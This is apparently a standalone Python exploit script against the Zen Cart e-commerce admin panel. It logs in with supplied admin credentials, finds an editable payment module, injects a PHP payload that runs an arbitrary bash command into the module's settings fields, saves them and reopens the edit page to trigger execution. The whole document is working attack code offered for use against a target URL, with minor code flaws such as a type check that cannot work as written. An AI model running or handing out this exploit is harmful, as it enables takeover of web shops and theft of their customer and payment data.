#!/usr/bin/python3
import mechanize as mc
import sys
import re
from bs4 import BeautifulSoup as bs
import base64 as B

try:
    url = sys.argv[1]
    assert url[-1] == "/"
    username = sys.argv[2]
    password = sys.argv[3]
    com = sys.argv[4]
except:
    print ("Usage: {sys.argv[0]} http://target.com/zencart/crackXXXXX/ username password command")
    exit(1)

modules = ["payment","shipping","ordertotal","plugin_manager"] # default

br = mc.Browser()
br.set_handle_robots(False)
br.addheaders=[('User-agent','Chrome')]

br.open(url+"login.php")

br.select_form("loginForm")
br.form["admin_name"] = username
br.form["admin_pass"] = password
send = br.submit()

mod = modules[0]
address = url+"index.php?cmd=modules&set="+mod
source = br.open(address).read()
adr = re.findall(b'<a href=".{150}', source)
adr2 = []
for i in adr:
    if b"&amp;module=" in i and b"action=remove" not in i:
        adr2.append(i.split(b'<a href="')[1].split(b'"')[0].replace(b"&amp;",b"&").decode())

for ek in adr2:
    source = br.open(ek).read()
    if b"id=\"editButton\">Edit</a>" in source:
        print (f"Target url: {ek}&action=edit")
        br.open(ek+"&action=edit")
        br.select_form("modules")
        form = br.forms()[0]
        list = b""
        for con in form.controls:
            try:
                value = br.form.find_control(name=con.name).value
                size = len(value)
                if type(value) == list:
                    if size == 0 or value[0] == "True" or value[0] == "False":
                        list += con.name.encode() + b"=" +  f"True','F'); echo `/bin/bash -c '{com}'`; //".encode() + b"&"
                        print("Payload injected")
                    else:
                        list +=  con.name.encode() + b"=" + value[0].encode() + b"&"
                else:
                    list +=  con.name.encode() + b"=" + value.encode() + b"&"
            except:
                pass
        print (list[:-1])
        #br.set_proxies({"http": "localhost:5555"})
        ac = br.open(ek+"&action=save", list[:-1])
        son = br.open(ek+"&action=edit")
        son = br.open(ek+"&action=edit")
        son = br.open(ek+"&action=edit")
        break







